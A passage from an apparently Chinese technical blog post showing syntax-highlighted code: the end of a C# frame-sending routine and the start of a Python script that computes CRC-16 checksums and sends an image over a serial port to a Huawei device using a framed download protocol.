</span><span style="color:#eff1f5;">            </span><span style="color:#bf616a;">stream</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">Read</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">buffer</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">0</span><span style="color:#eff1f5;">, </span><span style="color:#bf616a;">length</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">            </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">SendDataFrame</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">num3 </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">1</span><span style="color:#eff1f5;">, </span><span style="color:#bf616a;">buffer</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        }
</span><span style="color:#eff1f5;">        </span><span style="color:#b48ead;">if </span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">reportProgress </span><span style="color:#c0c5ce;">!= </span><span style="color:#d08770;">null</span><span style="color:#eff1f5;">)
</span><span style="color:#eff1f5;">        {
</span><span style="color:#eff1f5;">            </span><span style="color:#8fa1b3;">reportProgress</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">100</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">        }
</span><span style="color:#eff1f5;">        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#8fa1b3;">SendTailFrame</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">num3 </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">2</span><span style="color:#eff1f5;">);
</span><span style="color:#eff1f5;">    }
</span><span style="color:#eff1f5;">}
</span></pre>
<h3 id="jiao-hu-jiao-ben">交互脚本</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">serial
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">struct
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">binascii
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">p32 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">number</span><span style="color:#c0c5ce;">: struct.</span><span style="color:#8fa1b3;">pack</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">&gt;I</span><span style="color:#c0c5ce;">&#39;, number)
</span><span style="color:#c0c5ce;">p16 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">number</span><span style="color:#c0c5ce;">: struct.</span><span style="color:#8fa1b3;">pack</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">&gt;H</span><span style="color:#c0c5ce;">&#39;, number)
</span><span style="color:#c0c5ce;">p8 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">number</span><span style="color:#c0c5ce;">: struct.</span><span style="color:#8fa1b3;">pack</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">&gt;B</span><span style="color:#c0c5ce;">&#39;, number)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">crctab = [</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1021</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2042</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3063</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4084</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x50a5</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x60c6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x70e7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8108</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9129</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa14a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb16b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc18c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd1ad</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe1ce</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf1ef</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x1231</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x210</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3273</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2252</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x52b5</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4294</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x72f7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x62d6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9339</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8318</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb37b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa35a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd3bd</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc39c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf3ff</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe3de</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x2462</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3443</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x420</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1401</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x64e6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x74c7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x44a4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5485</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa56a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb54b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8528</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9509</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe5ee</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf5cf</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc5ac</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd58d</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x3653</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2672</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1611</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x630</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x76d7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x66f6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5695</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x46b4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb75b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa77a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9719</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8738</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf7df</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe7fe</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd79d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc7bc</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x48c4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x58e5</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6886</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x78a7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x840</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1861</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2802</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3823</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc9cc</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd9ed</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe98e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf9af</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8948</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9969</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa90a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb92b</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x5af5</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4ad4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7ab7</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6a96</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1a71</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa50</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3a33</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2a12</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xdbfd</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xcbdc</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xfbbf</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xeb9e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9b79</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8b58</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbb3b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xab1a</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x6ca6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7c87</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4ce4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5cc5</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2c22</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3c03</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc60</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1c41</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xedae</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xfd8f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xcdec</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xddcd</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xad2a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbd0b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8d68</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9d49</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x7e97</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6eb6</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5ed5</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4ef4</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3e13</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2e32</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1e51</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe70</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff9f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xefbe</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xdfdd</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xcffc</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbf1b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xaf3a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9f59</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8f78</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x9188</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x81a9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb1ca</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa1eb</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd10c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc12d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf14e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe16f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1080</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x30c2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x20e3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5004</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4025</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7046</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6067</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0x83b9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9398</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa3fb</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb3da</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc33d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd31c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe37f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf35e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2b1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1290</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x22f3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x32d2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4235</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5214</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6277</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7256</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0xb5ea</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa5cb</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x95a8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8589</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf56e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe54f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd52c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc50d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x34e2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x24c3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x14a0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x481</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7466</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6447</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5424</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4405</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0xa7db</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb7fa</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8799</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x97b8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe75f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf77e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc71d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xd73c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x26d3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x36f2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x691</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x16b0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6657</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7676</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4615</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5634</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0xd94c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xc96d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xf90e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xe92f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x99c8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x89e9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xb98a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xa9ab</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5844</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4865</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7806</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6827</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x18c0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8e1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3882</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x28a3</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0xcb7d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xdb5c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xeb3f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xfb1e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8bf9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9bd8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xabbb</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbb9a</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4a75</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5a54</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6a37</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7a16</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xaf1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1ad0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2ab3</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3a92</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0xfd2e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xed0f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xdd6c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xcd4d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbdaa</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xad8b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9de8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8dc9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7c26</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6c07</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5c64</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4c45</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3ca2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2c83</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1ce0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xcc1</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">        </span><span style="color:#d08770;">0xef1f</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xff3e</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xcf5d</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xdf7c</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xaf9b</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xbfba</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x8fd9</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x9ff8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x6e17</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x7e36</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x4e55</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x5e74</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2e93</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x3eb2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xed1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x1ef0</span><span style="color:#c0c5ce;">]
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">get_check_sum</span><span style="color:#c0c5ce;">( </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        num = </span><span style="color:#d08770;">0
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">data:
</span><span style="color:#c0c5ce;">            num  = ((num&lt;&lt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)|i)^crctab[(num&gt;&gt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)&amp;</span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">            num = (num&lt;&lt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)^crctab[(num&gt;&gt;</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">)&amp;</span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">]
</span><span style="color:#c0c5ce;">        
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">num&amp;</span><span style="color:#d08770;">0xffff
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">Huawei</span><span style="color:#eff1f5;">:
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    head_chunk_cmd = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\xfe</span><span style="color:#c0c5ce;">&#39;
</span><span style="color:#c0c5ce;">    data_chunk_cmd = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\xda</span><span style="color:#c0c5ce;">&#39;
</span><span style="color:#c0c5ce;">    tail_chunk_cmd = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\xed</span><span style="color:#c0c5ce;">&#39;
</span><span style="color:#c0c5ce;">    inquiry_chunk_cmd = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\xcd</span><span style="color:#c0c5ce;">&#39;
</span><span style="color:#c0c5ce;">     
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#96b5b4;">__init__</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.seq = </span><span style="color:#d08770;">0
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.address = </span><span style="color:#d08770;">0x22000
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.image_data = </span><span style="color:#d08770;">None
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;"># self.ser = 0
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.ser = serial.</span><span style="color:#8fa1b3;">Serial</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">COM3</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">baudrate</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">9600</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">bytesize</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">parity</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">N</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">stopbits</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">timeout</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">xonxoff</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">rtscts</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">getc</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">timeout</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.ser.</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(size) or </span><span style="color:#d08770;">None
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">putc</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">data</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">timeout</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.ser.</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(data)  </span><span style="color:#65737e;"># note that this ignores the timeout
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">set_image</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">image_data</span><span style="color:#c0c5ce;">):
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.image_data = image_data
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.image_size = </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(image_data)
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_send_image_data = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.image_data
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.to_sned_image_size = </span><span style="color:#bf616a;">self</span><span style="color:#c0c5ce;">.image_size
</span><span style="color:#c0c5ce;">
